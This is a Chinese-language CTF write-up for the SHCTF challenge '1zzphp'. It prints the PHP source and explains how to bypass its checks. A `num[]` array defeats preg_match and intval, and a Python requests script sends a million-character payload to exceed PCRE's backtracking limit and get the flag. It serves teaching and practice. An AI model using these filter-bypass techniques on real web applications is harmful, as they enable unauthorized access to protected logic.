---
layout: mypost
title: "[SHCTF]1zzphp"
categories: [ctf_wp]
---

（对于这个题里面的正则回溯绕过还是有不懂的话，可以去看看我的这篇文章--晕晕晕，正则回溯？！晕晕晕，以及之前发的那篇文章--CTF中那些奇奇怪怪的正则表达式）

![](006APoFYly8gvggsk336ig6050050x0c02.gif)

1.这个题目也是没有很多形象的东西，很直接的给了一个源码，这个还是很好审的，接下来带大家一起康康

![](image-20231101183632489.png)

```
<?php 
error_reporting(0);
highlight_file('./index.txt');
if(isset($_POST['c_ode']) && isset($_GET['num']))
{
    $code = (String)$_POST['c_ode'];
    $num=$_GET['num'];
    if(preg_match("/[0-9]/", $num))
    {
        die("no number!");
    }
    elseif(intval($num))
    {
      if(preg_match('/.+?SHCTF/is', $code))
      {
        die('no touch!');
      }
      if(stripos($code,'2023SHCTF') === FALSE)
      {
        die('what do you want');
      }
      echo $flag;
    }
} 
```

一起分析这个源码，首先还是高亮这个index.txt，然后分别用post和get方法去接受两个参数，第一层过滤是一个正则匹配（这个一看就很好绕），然后有一个intval的函数（这个函数也是CTF里面的老熟人了），来简单解释一下这个函数是干什么的

```
intval — 获取变量的整数值
具体一点的话是下面这个
int intval( var,base)
//var指要转换成 integer 的数量值,base指转化所使用的进制 
Note: 
如果 base 是 0，通过检测 var 的格式来决定使用的进制： 
◦ 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，  
◦ 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，  
◦ 将使用 10 进制 (decimal)
```

然后就又是一个正则了，这个正则首先一看就是一个非贪婪匹配（这个就理解成它会在原地等什么时候才能匹配到s，但是前面有一个.代表一个任意字符），具体抽象出来的意思就是只能以shctf前面不放东西，其实它就匹配不到，但是紧接着看后面这个stripos函数（这个函数也是经常被出成CTF的题目），这里也解释一下吧

```
stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）
```

意思就是必须得完完全全的匹配到这个'2023SHCTF'字符串，显然这个和上面这个正则是有冲突的，欧克源码就先说到这里

2.首先啊，咱们一步一步来，先看绕前面这两个，我们要满足`$num`里面没有数字（preg\_match检测不出来），同时满足`intval($num)`为1（true），这个直接采用数组就行，这就很常见的绕过了

```
preg_math()传入数组参数会直接返回0，同时intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值， intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1故此传入?num[]=1,产生错误返回1

所以就是?num[]=1
```

3.先给大家看个小视频吧，仔细观察，看完再继续看文章下面的内容

4.然后这个第二部分，要是之前没接触过这个正则回溯相关的知识的话，肯定是很难想到的，关于正则匹配的话我也写过一篇文章，文章的最后也给大家展示了p神发现的这个东西的应用，从网页到数据库，只要有用到正则匹配，且满足利用条件的，基本上就是通杀，所以近期也专门写了一篇关于正则回溯的1文章--晕晕晕，正则回溯？！晕晕晕，基本上就是贪婪匹配的话会一个一个回溯，而懒惰的话就是很容易出现这个问题，这个专业的叫法是PCRE回溯次数限制绕过，先给大家看下payload吧！

```
import requests
from io import BytesIO

url = "http://112.6.51.212:32998/"

session = requests.Session()

headers = {
    'User-Agent': 'Windows10 / Chrome 75.0.3770.142Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'
}

data = b'b' * 1000000 + b'2023SHCTF'
bytes_io = BytesIO(data)

params = {'num[]': 1}
post_data = {'c_ode': bytes_io}

response = session.request('POST', url, params=params, data=post_data, headers=headers)

print("md给我flag:")
print(response.content)
```

这个就是用python模拟发包的过程，然后超过100万次的匹配，那么正则就会崩溃，返回Flase，而这里也没有做一个强等于判断0是否等于Flase，所以就轻松绕过了，大家看不懂的话，先去看看那两篇文章，很简单的！！！

![](image-20231101210117548-1024x270.png)

Finish!!!